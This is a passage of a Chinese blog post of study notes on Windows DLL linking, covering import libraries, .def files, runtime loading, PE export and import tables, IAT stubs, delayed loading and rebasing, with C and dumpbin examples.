class="code"><pre><code class="hljs c"><span class="hljs-comment">/*myTest.c*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>__declspec(dllimport)  <span class="hljs-type">double</span> <span class="hljs-title function_">Sub</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">double</span> result =Sub(<span class="hljs-number">3.0</span>,<span class="hljs-number">2.0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result=%f\n&quot;</span>,result);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译时我们可以使用如下命令编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cl /c myTest.c<br><span class="hljs-built_in">link</span> myTest.obj test.lib<br></code></pre></td></tr></table></figure><p>lib文件中并不真正包含dll的代码和数据,他被用来描述dll的到处符号,包含了myTest.o链接test.dll时所需要的导入符号以及一部分”桩代码”,也被称为”胶水代码”,以便将程序与DLL黏在一起,而我们的test.lib这样的文件也被称为导入库</p><p>如下为MSVC静态库链接过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>test.c -&gt; cl -&gt; test.dll + test.exp + test.lib<br><br>myTest.c -&gt; cl -&gt; myTest.obj<br><br>myTest.obj + test.lib -&gt; <span class="hljs-built_in">link</span> -&gt; myTest.exe<br><br></code></pre></td></tr></table></figure><h2 id="使用模块定义文件"><a href="#使用模块定义文件" class="headerlink" title="使用模块定义文件"></a>使用模块定义文件</h2><p>声明DLL中某个函数是导出函数的办法有两种,除了之前使用的<code>&quot;__declspec(dllexport)&quot;</code>,另一种是采用模块定义(.def)文件声明</p><p>.def文件在MSVC链接过程中与链接脚本(link script)文件在ld连接过程中的作用类似,用于控制链接过程,为链接器提供有关链接程序的到处符号,属性以及一些其他信息</p><p>假设我们删除了test.c中所有的<code>&quot;__declspec(dllexport)&quot;</code>,创建一个 test.def文件,内容如下:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">LIBRARY <span class="hljs-keyword">test</span><br>EXPORTS<br><span class="hljs-keyword">Add</span><br><span class="hljs-keyword">Sub</span><br><span class="hljs-keyword">Mul</span><br></code></pre></td></tr></table></figure><p>然后用如下方式编译test.c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cl test.c /LD /DEF test.def<br><br>D:\0000tttteeesstt&gt;dumpbin /EXPORTS math.dll<br>...<br><br>          1    0 00001000 Add<br>          2    1 00001040 Mul<br>          3    2 00001020 Sub<br>...<br></code></pre></td></tr></table></figure><p>用这种方法也有一些在编译上的优势,比如MSCV默认对C语言的函数代码使用<code>&quot;_cdecl&quot;</code>调用规范,而这种情况下对函数不做任何符号修饰,但是一旦我们使用其他的函数调用规范,MSCV就会对符号名进行修饰,比如使用<code>&quot;_stdcall&quot;</code>调用的函数Add就会被修饰成”_Add@16”,前面以<code>&quot;_&quot;</code>开头,后面以<code>&quot;@n&quot;</code>结尾,n表示函数调用时参数所占堆栈空间的大小。使用.def文件可以将导出函数重新命名,比如当Add函数采用<code>&quot;__stdcall&quot;</code>时,我们可以使用如下的.def文件:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">LIBRARY test<br>EXPORTS<br><span class="hljs-keyword">Add</span>=_<span class="hljs-keyword">Add</span><span class="hljs-subst">@16</span><br><span class="hljs-keyword">Sub</span><br><span class="hljs-keyword">Mul</span><br></code></pre></td></tr></table></figure><p>我们使用这个.def生成.dll文件时,可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">看到个屁<br></code></pre></td></tr></table></figure><p>这种方式相当于起了一个别名,由于Windows的API经常采用<code>&quot;WINAPI&quot;</code>这种方式进行声明,但其本质是一个被定义为<code>&quot;__stdcall&quot;</code>的宏。</p><p>微软以DLL的形式提供windows的API,而每个API的导出函数又以<code>&quot;__stdcall&quot;</code>的形式被声明,但我们并未在windows的API中看到过_Add@16这种形式的命名方式,由此可见其也是采取了这种导出函数重命名的方式。</p><p>关于DLL导出还有如此一篇文章可以作参考:<a href="https://www.jianshu.com/p/1af030b26bb2">https://www.jianshu.com/p/1af030b26bb2</a></p><h2 id="DLL显式运行时链接"><a href="#DLL显式运行时链接" class="headerlink" title="DLL显式运行时链接"></a>DLL显式运行时链接</h2><p>与ELF类似,DLL也是支持运行时加载的,Windows提供了3个API:</p><ul><li><code>LoadLibrary</code>(或者<code>LoadLibraryEx</code>),该函数用于装载一个DLL到进程的地址空间,其功能与<code>dlopen</code>类似</li><li><code>GetProcAddress</code> 用于查找某个符号的地址,与dlsym类似</li><li><code>FreeLibrary</code> 用于卸载某个已加载的模块,与dclose类似</li></ul><p>如以下的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">double</span> <span class="hljs-params">(*Func)</span><span class="hljs-params">(<span class="hljs-type">double</span>,<span class="hljs-type">double</span>)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        Func func;<br>        <span class="hljs-type">double</span> result;<br><br>        <span class="hljs-comment">//Load DLL</span><br>        HINSTANCE hinstLib=LoadLibrary(<span class="hljs-string">&quot;test.dll&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!hinstLib)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error,Load lib failed!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//Get func address</span><br>        func=(Func)GetProcAddress(hinstLib,<span class="hljs-string">&quot;Add&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!func)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error,find func failed!\n&quot;</span>);<br>                FreeLibrary(hinstLib);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//call func</span><br>        result=func(<span class="hljs-number">1.0</span>,<span class="hljs-number">2.0</span>);<br>        FreeLibrary(histLib);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result is %f !\n&quot;</span>,result);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="符号导出导入表"><a href="#符号导出导入表" class="headerlink" title="符号导出导入表"></a>符号导出导入表</h1><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>当一个PE需要将一些函数或变量提供给其他PE文件使用时,我们就将这种行为称为符号导出(Symbol Exporting)</p><p>ELF导出的符号保存在<code>&quot;.dynsym&quot;</code>段中,而Windows下,其导出的概念也是类似的,所遇到处的符号被击中存放在了被称为<code>导出表(Export Table)</code>的结构中.,也可以简单的将其理解为一个符号名与符号地址的映射关系</p><p>PE头中有一个叫做<code>DataDirectory</code>的结构数组,他一共有十六个元素,每一个元素中保存的是一个地址和长度,其中第一个元素就是导出表的结构的地址和长度</p><p>导出表为定义在<code>&quot;winnt.h&quot;</code>的一个叫<code>IMAGE_EXPORT_DIRECTORY</code>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> IMAGE_EXPORT_DIRECTORY STRUCT<span class="hljs-comment">//【导出表，共40字节】</span><br>&#123;<br>+<span class="hljs-number">00</span> h DWORD Characteristics ; <span class="hljs-comment">//未使用，总是定义为0</span><br>+<span class="hljs-number">04</span> h DWORD TimeDateStamp ; <span class="hljs-comment">//文件生成时间</span><br>+<span class="hljs-number">08</span> h WORD MajorVersion     ; <span class="hljs-comment">//未使用，总是定义为0</span><br>+<span class="hljs-number">0</span>A h WORD MinorVersion ; <span class="hljs-comment">//未使用，总是定义为0</span><br>+<span class="hljs-number">0</span>C h DWORD Name     ; <span class="hljs-comment">//模块的真实名称</span><br>+<span class="hljs-number">10</span> h DWORD Base     ; <span class="hljs-comment">//基数，加上序数就是函数地址数组的索引值,一般为1</span><br>+<span class="hljs-number">14</span> h DWORD NumberOfFunctions ; <span class="hljs-comment">//导出函数的总数</span><br>+<span class="hljs-number">18</span> h DWORD NumberOfNames ; <span class="hljs-comment">//以名称方式导出的函数的总数</span><br>+<span class="hljs-number">1</span>C h DWORD AddressOfFunctions ; <span class="hljs-comment">//指向输出函数地址的RVA</span><br>+<span class="hljs-number">20</span> h DWORD AddressOfNames ; <span class="hljs-comment">//指向输出函数名字的RVA</span><br>+<span class="hljs-number">24</span> h DWORD AddressOfNameOrdinals ; <span class="hljs-comment">//指向输出函数序号的RVA</span><br>&#125;;IMAGE_EXPORT_DIRECTORY ENDS<br><br></code></pre></td></tr></table></figure><p>我们重点关注的是最后三个变量,<code>AddressOfFunctions</code>,<code>AddressOfNames</code>,以及<code>AddressOfNameOrdinals</code></p><ul><li>AddressOfFunctions: <code>导出地址表EAT</code>,存放了各个导出函数的RVA</li><li>AddressOfNames: <code>函数名表</code>,保存了导出函数的名字,其内以ASCII值排序,以便动态采用二分查找的方式</li><li>AddressOfOrdinals: <code>序号对应表</code>,具体在下面介绍</li></ul><h3 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h3><p>这也是一个来自远古的遗物,由于最原始的windows内存太小了,如果存储名字的话实在是太大了,因此人们采用序号的形式来导出函数</p><p>那么什么是序号呢? </p><p>一个导出函数的序号就是函数在EAT中的地址下标加一个Base值(也就是IMAGE_EXPORT_DIRECTORY中的Base,默认该值为1)</p><p>比如Mul的RVA是0x1040s,他在EAT中的下标为1,加一个Base值其序号就是2了,那么导入的时候也是同理,只需要减一个Base值然后按下标寻找就好了</p><p>但是由于我们的DLL经常改变,序号的形式就会有着诸多的不便,因此如今基本都不使用序号来导入函数了,而是直接使用函数名即可,而由于Windows是向后兼容的,因此序号也并未被抛弃,导出函数可以没有名字,但是一定会有一个序号</p><p>那么系统如何确定符号名表和EAT表的关系呢,这就需要通过第三个表即序号对应表来做映射了,比如程序导入了Add函数,那么首先链接器在函数名表中二分查找Add函数,然后在名字序号对应表中找到其序号,减去Image值,最后去EAT中按下标取出地址即可</p><blockquote><p>link链接器也提供了一种导出符号的方式,比如:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">link <span class="hljs-keyword">test</span>.obj /DLL /<span class="hljs-keyword">EXPORT</span>:_Add<br></code></pre></td></tr></table></figure></blockquote><p>而如果是使用<code>&quot;__declspec(dllexport)&quot;</code>扩展,其实际是用目标文件的编译器指示来实现的(PE目标文件的”.drectve”段),对于之前的例子而言,它其实保存了3个<code>&quot;/EXPORT&quot;</code>参数    </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">D:\0000tttteeesstt&gt;dumpbin <span class="hljs-string">/DIRECTIVES</span> test.obj<br>Microsoft <span class="hljs-params">(R)</span> COFF/PE Dumper Version 14.27.29111.0<br>Copyright <span class="hljs-params">(C)</span> Microsoft Corporation.  All rights reserved.<br><br><br>Dump of file test.obj<br><br>File Type: COFF OBJECT<br><br>   Linker Directives<br>   <span class="hljs-params">-----------------</span><br>   <span class="hljs-string">/DEFAULTLIB</span><span class="hljs-function">:LIBCMTD</span><br>   <span class="hljs-string">/DEFAULTLIB</span><span class="hljs-function">:OLDNAMES</span><br>   <span class="hljs-string">/EXPORT</span><span class="hljs-function">:Add</span><br>   <span class="hljs-string">/EXPORT</span><span class="hljs-function">:Sub</span><br>   <span class="hljs-string">/EXPORT</span><span class="hljs-function">:Mul</span><br><br>  Summary<br><br>          20 <span class="hljs-string">.chks64</span><br>          6C <span class="hljs-string">.debug</span>$S<br>          54 <span class="hljs-string">.drectve</span><br>          59 <span class="hljs-string">.text</span>$mn<br></code></pre></td></tr></table></figure><h2 id="EXP文件-下面内容几乎完全摘抄于原文"><a href="#EXP文件-下面内容几乎完全摘抄于原文" class="headerlink" title="EXP文件(下面内容几乎完全摘抄于原文)"></a>EXP文件(下面内容几乎完全摘抄于原文)</h2><p>在创建DLL的同时我们也会得到一个EXP文件,它其实是链接器创建DLL时的临时文件,链接器在创建DLL时与静态链接一样采用两遍扫描过程,DLL一般都有到处符号,链接器在第一遍时遍历所有的目标文件并且收集所有导出符号信息并且创建DLL的导出表</p><p>为了方便起见,链接器会把这个导出表放到一个临时的目标文件叫做<code>&quot;.edata&quot;</code>的段中,这个目标文件就是EXP文件,也就是说它其实是PE&#x2F;COFF的目标文件,只不过其后缀不是.obj而是.exp而已</p><p>第二遍时他就会把这个EXP文件当做普通目标文件一样,与其他输入的目标文件连接在一起并输出DLL,此时EXP文件中的<code>&quot;.edata&quot;</code>段就会被输出到DLL文件中并称为导出表,不过一般不会保留<code>&quot;.edata&quot;</code>段而是将其存在<code>&quot;.rdata&quot;</code>中</p><h2 id="导出重定向"><a href="#导出重定向" class="headerlink" title="导出重定向"></a>导出重定向</h2><p>DLL有被称为导出重定向(Export Forwarding)的机制,也就是将某个导出符号重定向到另一个DLL中</p><p>比如XP系统中,<code>&quot;KERNEL32.DLL&quot;</code>的<code>HeapAlloc</code>函数被重新定向到了<code>&quot;NTDLL.DLL&quot;</code>中的<code>RtlAllocHeap</code>函数,重定向也可以使用.def模块定义文件,比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs def">EXPORTS<br>    HeapAlloc = NTDLL.RtlAllocHeap<br></code></pre></td></tr></table></figure><p>其机制就是如果发现导出表中的RVA指向了一个导出表,那么就意味着该符号呗重定向了</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>程序中使用来自DLL的函数和变量就被称为符号导入</p><p>在ELF中,<code>&quot;.rel.dyn&quot;</code>和<code>&quot;.rel.plt&quot;</code>两个段分别保存了该模块所需要导入的变量和函数的符号以及所在的模块等信息<br>而<code>&quot;.got&quot;</code>和<code>&quot;.got.plt&quot;</code>则保存着这些变量和函数的真正地址</p><p>而Windows下也有类似延迟绑定的机制,他的名字更为直接,他被称为导入表(Import Table)<br>当某个PE文件被加载时,Windows加载器的其中一个任务就是将所有需要导入的函数地址确定并将导入表中的元素调整到正确的地址,以实现动态链接的过程 </p><p>dumpbin也可以查看导入表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\0000tttteeesstt&gt;dumpbin /IMPORTS test.dll<br>Microsoft (R) COFF/PE Dumper Version 14.27.29111.0<br>Copyright (C) Microsoft Corporation.  All rights reserved.<br><br>Dump of file test.dll<br><br>File Type: DLL<br><br>  Section contains the following imports:<br><br>    KERNEL32.dll<br>             180038000 Import Address Table<br>             180049AB8 Import Name Table<br>                     0 <span class="hljs-keyword">time</span> <span class="hljs-built_in">date</span> stamp<br>                     0 Index of first forwarder reference<br><br>                         450 QueryPerformanceCounter<br>                         21E GetCurrentProcessId<br>                         222 GetCurrentThreadId<br>                         2F0 GetSystemTimeAsFileTime<br>                         36C InitializeSListHead<br>                         4D3 RtlCaptureContext<br>                         4DA RtlLookupFunctionEntry<br>                         4E1 RtlVirtualUnwind<br>                         382 IsDebuggerPresent<br>                         5BC UnhandledExceptionFilter<br>                         57B SetUnhandledExceptionFilter<br>                         2D7 GetStartupInfoW<br>                         389 IsProcessorFeaturePresent<br>                         27E GetModuleHandleW<br>                         21D GetCurrentProcess<br>                         59A TerminateProcess<br>                         ...<br></code></pre></td></tr></table></figure><p>上面显示的一部分函数是由于在构建Windows DLL时,还链接了支持DLL运行的基本运行库,而这个需要Kernel32.dll,所有就有了这些函数</p><p>在Windows下,系统的足昂再起会确保任何一个模块的依赖条件都被得到满足,比如Windows程序都会依赖于KERNEL32.DLL,而KERNEL32.DLL又会依赖于NTDLL.DLL<br>那么Windows加载时就会确保这两个都被加载,以此类推,如果动态链接过程中某个被依赖的模块无法正确加载,那么系统将会提示错误(比如缺少某个DLL)</p><p>在PE文件中,导入表的结构是IMAGE_IMPORT_DESCRIPTOR的结构体数组,而每一个该结构都对应一个被导入的DLL,该结构体也被定义在<code>&quot;Winnt.h&quot;</code>中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>        DWORD OriginalFirstThunk; <span class="hljs-comment">//INT</span><br>        DWORD TimeDateStamp;<br>        DWORD ForwaderChain;<br>        DWORD Name;<br>        DWORD FirstThunk; <span class="hljs-comment">//IAT</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><br></code></pre></td></tr></table></figure><p>结构体中的<code>FirstThunk</code>指向一个导入地址数组(Import Address Table),IAT是导入表中最重要的结构,IAT中每个元素对应一个被导入的符号,元素的值在不同的情况下有不同的含义。</p><p>在动态链接器刚完成映射还没有开始重定位和符号解析时,IAT中的元素值表示相对应的导入符号的序号或者是符号名。</p><p>当Windows的动态链接器在完成该模块的链接时,元素值会被动态链接器改写成该符号的真正地址,从这一点看,导入地址数组与ELF中的GOT表非常类似。</p><p>我们可以通过看导入地址数组的元素最高位来判断其中包含的是导入符号的序号还是符号的名字,比如32位的PE文件,如果最高位被置为1,那么低32位就是导入符号的序号值,如果没有,那么元素的值是指向一个叫做<code>IMAGE_IMPORT_BY_NAME</code>结构的RVA。</p><p><code>IMAGE_IMPORT_BY_NAME</code>由一个<code>WORD值</code>和一个<code>字符串</code>组成,这个WORD值被称为<code>&quot;Hint&quot;</code>值,所谓<code>&quot;Hint&quot;</code>值,其实就是导入符号中最有可能的序号值,而后面的字符串是符号名,当使用符号名导入时,动态链接器会先使用<code>&quot;Hint&quot;</code>值的提示去定位该符号在目标导出表中的位置,如果刚好是需要的符号,那么就直接命中,而如果没有,就使用二分法来进行符号查找。</p><p>在<code>IMAGE_IMPORT_DESCRIPTOR</code>结构中,还有一个指针OriginalFirstThrunk指向一个叫做导入名称表(Import Name Table),简称<code>INT</code>表,这个表与<code>IAT</code>表一样,但<code>INT</code>被用于<code>DLL绑定</code>,它用来存放绑定符号的地址。</p><p>Windows的动态链接器会在装载模块的时候,改写导入表中的IAT,但PE的导入表一般是只读的,往往位于<code>&quot;.rdata&quot;</code>这样的段中,他可以改写的原因是动态链接库也是内核的一部分,因此可以修改PE装载以后的任意一个部分,包括其内容和页面属性,Windows的做法是在装载的时候将导入表所在的位置的页改为可读写,而一旦IAT被改写完成,再将这些页面设置回只读属性.</p><h3 id="延迟载入-Delayed-Load"><a href="#延迟载入-Delayed-Load" class="headerlink" title="延迟载入(Delayed Load)"></a>延迟载入(Delayed Load)</h3><p>这种载入方式有点像隐式装载和显式装载的混合体,当我们链接一个支持延迟载入的DLL时,链接器会产生与浦普通DLL非常类似的数据,但操作系统会忽略这些数据</p><p>当延迟载入的API第一次被调用时,由链接器添加的特殊的桩代码就会启动,这个桩代码负责对DLL的装载工作,然后这个桩代码通过调用<code>GetProcAddress</code>来找到被调用的API的地址,MSVC也做了一些优化使得该方式与普通方式载入的DLL速度相差无几</p><h2 id="导入函数的调用"><a href="#导入函数的调用" class="headerlink" title="导入函数的调用"></a>导入函数的调用</h2><p>如果在PE的模块中需要调用一个导入函数,如果使用ELF GOT机制就是使用一个简介调用指令,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">CALL DWORD PTR [0X0040D11C]<br></code></pre></td></tr></table></figure><blockquote><p>PE DLL的地址无关性</p></blockquote><p>如果ELF调用者本身的模块是地址无关的,那么通过GOT跳转之前,需要计算目标函数地址在GOT表中的位置,然后再间接跳转,以此来实现地址无关</p><p><code>但PE DLL 的代码段并不是地址无关的</code></p><p>PE使用一种叫做重定基地址的方法来解决进程空间中地址冲突的问题</p><p>但这种方式也有一定的问题,因为编译器无法判断一个函数是本模块内部的,还是从外部导入的</p><p><strong>因为PE没有类似ELF的共享对象有全局符号介入的问题,所以对于模块内部的全局函数调用,编译器产生的都是直接调用指令</strong></p><p>为了使编译器可以区分函数从内部导入还是该模块内部定义的,MSVC引入了拓展属性<code>&quot;__declspec(dllimport)&quot;</code>,也就意味着一旦一个函数被如此声明了,编译器就会知道他是从外部导入的,来以此产生相应的指令形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ASM">内部:<br>CALL XXXXX<br><br>外部:<br>CALL DWORD PTR [0xXXXXXXXX]<br></code></pre></td></tr></table></figure><p>而在<code>&quot;__declspec&quot;</code>关键字引入之前,对于导入函数的调用,编译器并不区分导入函数和导出函数,统一的产生直接调用的指令,但链接器会将导入函数的目标地址导向一小段桩代码(Stub),由桩代码在将控制权交给IAT中的真正地址,实现如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">CALL 0X00400100C<br>...<br>0x00400100C:<br>JMP DWORD PTR [0x0040D11C]<br></code></pre></td></tr></table></figure><p>对于调用函数而言,其只是产生一般形式的指令<code>&quot;CALL XXXX&quot;</code>,直到链接时才会将这个地址重定位到一段桩代码,即那条JMP指令处,然后这条JMP指令才通过IAT间接跳转到导入函数</p><p>但链接器一般是不会产生指令的,因此刚刚所说的桩代码其实是存在产生DLL文件时的LIB文件(导入库)中的</p><p>编译器在产生导入库时,同一个导出函数会产生两个符号的定义,比如<code>foo</code>函数会有<code>foo</code>和<code>__imp_foo</code>两个符号,而这两个符号的区别在于,<code>foo</code>指向<code>foo</code>函数的桩代码,而<code>__imp_foo</code>指向<code>foo</code>函数在IAT中的位置,因此当我们使用<code>&quot;__declspec(dllimport)&quot;</code>来声明foo导入函数时,编译器就会在该倒入函数前加上前缀<code>&quot;__imp__&quot;</code>,以确保跟导入库中的<code>&quot;__imp__foo&quot;</code>能够正确链接;如果不使用<code>&quot;__declsepc(dllimport)&quot;</code>,编译器就会产生一个正常的foo符号引用一遍和导入库中的foo符号定义相链接。</p><p>如今的编译器两种导入方式都支持,但最好使用<code>&quot;__declspec(dllimport)&quot;</code>来声明导入符号</p><h1 id="DLL-优化"><a href="#DLL-优化" class="headerlink" title="DLL 优化"></a>DLL 优化</h1><blockquote><p>由于DLL的代码段和数据段不是地址无关的,那么就意味着它默认需要被装载到由ImageBase指定的目标地址中,如果目标地址被占用就会Rebase,而频繁的重定位也会使得程序启动速度太慢</p><p>而且动态链接过程中导入函数的符号在运行时需要被逐个解析,这个过程中不可避免的是符号字符串的比较和查找过程,而这个过程仍然是非常耗时的,这也是影响DLL性能的一个原因之一。</p></blockquote><p>太长不看版,符号查找和Rebase会使得程序启动时间巨长</p><h2 id="重定基地址-Rebasing"><a href="#重定基地址-Rebasing" class="headerlink" title="重定基地址(Rebasing)"></a>重定基地址(Rebasing)</h2><p>Windwos PE采用 <strong>装载时重定位</strong> 的方法来解决地址冲突问题,在DLL模块装载时,如果目标地址被占用操作系统就会分配一块新的内存,而因为DLL代码段不是地址无关的,DLL中所有涉及到绝对地址的引用也都进行重定位.</p><p>但这样的重定位也有一点特殊,因为只需要加一个和固定值的差值即可,比如一个DLL的基地址是0X1000,而如果其代码中有如此的指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV DWORD PTR [0X1100] 0X100<br></code></pre></td></tr></table></figure><p>那么假设0x1100是该模块中一个变量foo的地址,也就意味着该变量的RVA是0x100,但装载时如果0x1000被占用了,那么就会重定一个新的基地址,比如0x2000,因此此时foo的地址其实是0x2100,所以指令应该被改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV DWORD PTR [0X2100] 0X100<br></code></pre></td></tr></table></figure><p>也就是说所有的需要重定位的地方只需要加上一个原基地址和现在加载的基地址的差值即可,这种方式速度比一般的重定位要快</p><p>PE文件的重定位信息被放在了<code>&quot;.reloc&quot;</code>段,我们可以从PE文件头中的<code>DataDirectory</code>里得到重定位段的信息,但EXE文件默认不会有重定位段,因为EXE是进程运行时第一个被装载进虚拟内存的,这也就意味着它不会被人抢占基地址,但DLL虽然可以使用<code>&quot;/FIEXED&quot;</code>来禁止产生重定位信息,但可能会导致装载失败</p><p>缺点:</p><p>用空间换时间</p><p>因为一个DLL被多个进程共享时该DLL会被进程装载到不同的位置,因此每一个进程都会有一个单独的DLL代码段的副本,而且当需要被重定基地址的代码段需要被换出时,需要被写到交换空间中</p><h3 id="改变默认基地址"><a href="#改变默认基地址" class="headerlink" title="改变默认基地址"></a>改变默认基地址</h3><p>这里直接拿书上的例子了</p><table><thead><tr><th>模块</th><th>起始地址</th><th>结束地址</th></tr></thead><tbody><tr><td>main.exe</td><td>0x00400000</td><td>0x00410000</td></tr><tr><td>foo.dll</td><td>0x10000000</td><td>0x10010000</td></tr><tr><td>bar.dll</td><td>0x10010000</td><td>0x10020000</td></tr></tbody></table><p>bar.dll的基地址被重定位到了0x10010000,那么为了优化速度,我们可以采取改变默认基地址的方式,将其基地址修改成<code>0x10010000</code></p><p>MSCV的链接器就提供了这样的修改功能:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">link</span> /BASE:0X10010000,0X10000  /DLL 